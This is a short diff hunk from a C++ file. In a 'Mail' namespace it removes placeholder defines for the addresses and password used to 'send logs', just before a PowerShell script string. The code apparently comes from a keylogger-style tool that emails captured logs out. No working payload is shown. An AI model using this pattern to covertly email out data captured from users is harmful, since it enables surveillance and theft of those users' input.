@@ -20,9 +20,6 @@ using namespace std;
 namespace Mail
 {
 //Edit sender/receiver information
-#define X_EM_TO "EMAIL TO SEND LOGS TO"
-#define X_EM_FROM "EMAIL TO SEND LOGS FROM"
-#define X_EM_PASS "EMAIL PASSWORD"
 
 	//Power Shell script
 	const string &PowerShellScript =
